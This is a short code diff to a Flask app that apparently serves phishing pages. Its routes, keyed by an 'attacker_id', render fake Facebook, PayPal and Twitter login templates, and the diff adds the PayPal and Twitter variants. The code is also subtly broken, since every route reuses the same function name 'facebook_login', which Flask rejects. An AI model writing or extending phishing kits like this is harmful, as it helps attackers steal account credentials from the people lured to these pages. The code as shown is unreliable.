@@ -29,11 +29,11 @@ def facebook_login(attacker_id):
 
 @app.route('/paypal-login/<attacker_id>')
 def facebook_login(attacker_id):
-    return render_template('facebook.html', attacker_id=attacker_id)
+    return render_template('paypal.html', attacker_id=attacker_id)
 
-@app.route('/facebook-login/<attacker_id>')
+@app.route('/twitter-login/<attacker_id>')
 def facebook_login(attacker_id):
-    return render_template('facebook.html', attacker_id=attacker_id)
+    return render_template('twitter.html', attacker_id=attacker_id)
 
 @app.route('/facebook-login/<attacker_id>')
 def facebook_login(attacker_id):
